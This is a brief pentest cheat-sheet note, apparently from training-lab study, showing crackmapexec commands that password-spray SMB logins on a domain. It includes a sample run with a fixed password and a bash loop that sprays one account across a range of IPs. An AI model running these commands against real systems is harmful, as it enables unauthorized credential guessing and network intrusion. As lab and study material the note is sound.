crackmapexec smb <ip> -u <usernamelist> -p '<PASS>' -d <domain> --continue-on-success #<--- Perform several log-in tries to a SMB service in order to discover valid credentials.

#For example; crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success.

#This can be extended with a loop to a several IPs in order to explore a netowork which, often, is more common.

for i in $(seq 69 77); do crackmapexec smb 192.168.200.$i -u pete -p 'Nexus123!' -d corp.com;done
